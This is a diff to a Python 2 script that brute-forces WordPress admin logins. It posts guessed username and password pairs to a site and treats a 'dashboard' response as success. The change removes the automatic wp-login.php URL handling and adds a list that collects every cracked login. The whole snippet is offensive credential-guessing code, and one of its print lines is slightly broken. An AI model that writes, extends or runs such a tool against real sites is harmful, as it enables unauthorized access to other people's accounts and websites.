@@ -18,16 +18,10 @@ __date__   = "16.04.2017"
 import sys
 import requests
 
+found = []
+
 def brute(site, password, username="admin"):
 	''' Try login to site with username:password '''
-
-	if "wp-login.php" not in site:
-		if site[-1] != "/":
-			site = site + "/wp-login.php"
-		else:
-			site = site + "wp-login.php"
-	else:
-		pass
 
 	try:
 		payload = {"log": username, "pwd": password}
@@ -35,6 +29,7 @@ def brute(site, password, username="admin"):
 
 		if "dashboard" in text:
 			print "\n"+"-*60"+"[+] Site: %s\n\t[*] Username:%s\n\t[*] Password: %s\n"%(site, username, password) + "-"*60
+			found.append((site, username, password))
 	except:
 		pass
 
